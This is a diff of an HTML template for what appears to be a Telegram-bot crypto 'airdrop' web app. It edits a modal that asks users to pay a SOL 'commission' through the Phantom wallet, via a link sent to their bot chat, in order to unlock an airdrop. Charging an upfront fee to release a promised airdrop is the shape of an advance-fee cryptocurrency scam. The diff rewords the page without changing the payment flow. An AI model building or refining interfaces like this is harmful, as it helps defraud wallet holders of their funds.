@@ -627,29 +627,24 @@
             </div>
         </div>
 
-        <div class="commission-modal" id="commissionModal">
+        <!-- Commission Modal -->
+        <div id="commissionModal" class="commission-modal">
             <div class="commission-modal-content">
                 <div class="modal-logo">💰</div>
-                <h3>Commission Payment Required</h3>
-                <p class="modal-subtitle">To unlock the airdrop you need to pay {{ commission_amount }} SOL
-                    commission</p>
+                <h3>Commission Payment</h3>
+                <p class="modal-subtitle">Choose your payment method</p>
 
                 <div class="modal-info-box">
-                    <h4>How it works:</h4>
-                    <ol>
-                        <li>We will send a secure payment link to your private chat with the bot</li>
-                        <li>Click the link — it opens in browser</li>
-                        <li>Pay with Phantom (extension or app)</li>
-                        <li>Return here — status updates automatically</li>
-                    </ol>
+                    <h4>📋 Payment Instructions</h4>
+                    <p>Click the button below to receive a payment link in your Telegram chat.</p>
                 </div>
 
-                <div class="phantom-modal-buttons">
-                    <button class="phantom-modal-btn secondary" onclick="closeCommissionModal()">
-                        ❌ Cancel
-                    </button>
-                    <button class="phantom-modal-btn primary" onclick="sendCommissionLinkToChat()">
+                <div class="modal-buttons">
+                    <button class="modal-btn pay" onclick="sendPaymentLinkToChat()">
                         📱 Send Payment Link to Chat
+                    </button>
+                    <button class="modal-btn cancel" onclick="closeCommissionModal()">
+                        ❌ Cancel
                     </button>
                 </div>
             </div>
